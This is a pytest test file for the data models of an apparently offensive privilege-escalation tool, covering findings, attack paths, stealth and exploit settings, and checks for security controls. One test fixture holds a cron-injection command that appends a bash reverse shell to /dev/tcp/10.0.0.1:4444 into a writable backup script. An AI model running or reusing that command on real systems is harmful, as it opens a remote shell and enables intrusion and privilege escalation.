"""
tests/test_models.py

Unit tests for core data models.
Run with: pytest tests/ -v
"""

import pytest
from pip.models.finding import Finding, FindingCategory, Severity
from pip.models.attack_path import AttackPath, AttackStep
from pip.models.context import (
    ScanConfig, ScanMode, StealthProfile, ReportType,
    SystemContext, UserContext, SecurityControls, EnvironmentType, ShellType,
)


# ── Finding tests ─────────────────────────────────────────────────────────────

class TestFinding:
    def test_finding_creation_minimal(self):
        f = Finding(
            title="Test finding",
            category=FindingCategory.SUID,
            severity=Severity.HIGH,
            description="A test finding.",
        )
        assert f.title == "Test finding"
        assert f.severity == Severity.HIGH
        assert f.verified is False
        assert f.confidence == 0.5

    def test_finding_to_dict_roundtrip(self):
        f = Finding(
            title="SUID binary",
            category=FindingCategory.SUID,
            severity=Severity.CRITICAL,
            description="Test",
            affected_path="/usr/bin/find",
            mitre_id="T1548.001",
            verified=True,
            confidence=0.95,
        )
        d = f.to_dict()
        assert d["severity"] == "critical"
        assert d["category"] == "suid"
        assert d["verified"] is True
        assert d["mitre_id"] == "T1548.001"

    def test_finding_repr(self):
        f = Finding(title="X", category=FindingCategory.SUDO, severity=Severity.LOW, description="")
        assert "LOW" in repr(f)
        assert "X" in repr(f)

    def test_finding_default_tags_is_list(self):
        f1 = Finding(title="a", category=FindingCategory.OTHER, severity=Severity.INFO, description="")
        f2 = Finding(title="b", category=FindingCategory.OTHER, severity=Severity.INFO, description="")
        # Tags must not share the same list object
        f1.tags.append("x")
        assert "x" not in f2.tags


# ── AttackPath tests ──────────────────────────────────────────────────────────

class TestAttackPath:
    def _make_path(self, score: float = 9.5, verified: bool = True) -> AttackPath:
        finding = Finding(
            title="Cron script writable",
            category=FindingCategory.CRON,
            severity=Severity.CRITICAL,
            description="World-writable cron script.",
            affected_path="/opt/backup.sh",
        )
        step = AttackStep(
            order=1,
            description="Inject payload into /opt/backup.sh",
            command="echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /opt/backup.sh",
            finding=finding,
            wait_seconds=60,
        )
        return AttackPath(
            path_id="path_001",
            title="Cron injection via backup.sh",
            steps=[step],
            mitre_ids=["T1053.003"],
            composite_score=score,
            exploitability=0.9,
            reliability=0.92,
            impact=1.0,
            stealth=0.85,
            verified=verified,
            estimated_time_seconds=65,
        )

    def test_score_label_critical(self):
        p = self._make_path(score=9.5)
        assert p.score_label == "CRITICAL"
        assert p.is_critical is True

    def test_score_label_high(self):
        p = self._make_path(score=7.0)
        assert p.score_label == "HIGH"
        assert p.is_critical is False

    def test_score_label_medium(self):
        p = self._make_path(score=5.0)
        assert p.score_label == "MEDIUM"

    def test_score_label_low(self):
        p = self._make_path(score=3.0)
        assert p.score_label == "LOW"

    def test_finding_count(self):
        p = self._make_path()
        assert p.finding_count == 1

    def test_to_dict_structure(self):
        p = self._make_path()
        d = p.to_dict()
        assert "path_id" in d
        assert "steps" in d
        assert len(d["steps"]) == 1
        assert d["steps"][0]["order"] == 1
        assert "finding" in d["steps"][0]


# ── ScanConfig tests ──────────────────────────────────────────────────────────

class TestScanConfig:
    def test_defaults(self):
        cfg = ScanConfig()
        assert cfg.mode == ScanMode.DEEP
        assert cfg.stealth == StealthProfile.NORMAL
        assert cfg.exploit_enabled is False
        assert cfg.no_disk is False
        assert cfg.timeout == 300

    def test_audit_mode_property(self):
        cfg = ScanConfig(mode=ScanMode.AUDIT)
        assert cfg.is_audit_only is True
        cfg2 = ScanConfig(mode=ScanMode.DEEP)
        assert cfg2.is_audit_only is False

    def test_report_type_all_generates_executive(self):
        cfg = ScanConfig(report_types=[ReportType.ALL])
        assert cfg.generates_executive_report is True
        assert cfg.generates_blue_team_report is True

    def test_report_type_technical_only(self):
        cfg = ScanConfig(report_types=[ReportType.TECHNICAL])
        assert cfg.generates_executive_report is False
        assert cfg.generates_blue_team_report is False

    def test_blue_team_flag_enables_blue_team_report(self):
        cfg = ScanConfig(report_types=[ReportType.TECHNICAL], blue_team=True)
        assert cfg.generates_blue_team_report is True


# ── SystemContext tests ───────────────────────────────────────────────────────

class TestSystemContext:
    def test_default_environment_unknown(self):
        ctx = SystemContext()
        assert ctx.environment_type == EnvironmentType.UNKNOWN

    def test_security_controls_default_all_false(self):
        ctx = SystemContext()
        assert ctx.security_controls.selinux_enabled is False
        assert ctx.security_controls.apparmor_enabled is False
        assert ctx.security_controls.crowdstrike_running is False
